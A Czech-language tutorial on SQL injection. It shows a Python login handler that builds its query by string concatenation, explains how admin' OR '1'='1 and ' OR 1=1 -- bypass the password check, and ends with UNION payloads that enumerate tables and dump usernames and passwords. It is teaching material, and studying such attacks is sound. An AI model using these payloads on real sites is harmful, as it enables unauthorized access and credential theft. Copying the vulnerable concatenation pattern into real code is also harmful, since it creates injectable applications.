### Jak funguje SQL databáze

Aplikace ukládá data do databáze a ptá se jí dotazy v jazyce SQL:
```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'heslo'
```

`*` = vrať vše, `FROM users` = z tabulky users, `WHERE` = kde platí podmínka.

### Jak vzniká zranitelnost

Zranitelná aplikace sestaví dotaz **lepením stringů**:

```python
username = request.form['username']    # vstup od uživatele
password = request.form['password']

query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
```

Pokud zadáš normální hodnoty:
```
username: admin
password: heslo
```
Vznikne normální dotaz:
```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'heslo'
```

### Útok – rozbití struktury dotazu

Zadáš jako username:
```
admin' OR '1'='1
```
Do dotazu se vloží tvůj vstup doslova:
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'cokoli'
```

`'1'='1'` je vždy pravda, takže podmínka je vždy splněna – databáze vrátí všechny uživatele a ty se přihlásíš bez hesla.

### Vizuálně – co se děje s uvozovkami
```
dotaz:   SELECT * FROM users WHERE username = '  [VSTUP]  '
normálně:                                         admin
výsledek: SELECT * FROM users WHERE username = 'admin'

útok:    SELECT * FROM users WHERE username = '  [VSTUP]  '
vstup:                                            admin' OR '1'='1
výsledek: SELECT * FROM users WHERE username = 'admin' OR '1'='1'
                                                        ↑
                                              uvozovka zavře původní string
                                              a začne nový SQL kód
```
## Další payloady
```sql
-- Přihlášení jako první uživatel v databázi
' OR 1=1 --

-- -- je komentář v SQL, zbytek dotazu se ignoruje
-- takže AND password = '...' se vůbec nevyhodnotí

-- Celý dotaz pak vypadá:
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'cokoli'
-- vše za -- je komentář ↑
```
**co tam dělat**
```sql
-- Zjisti strukturu databáze (UNION útok)
' UNION SELECT table_name, null FROM information_schema.tables --

-- Vypis všechny uživatele
' UNION SELECT username, password FROM users --
```
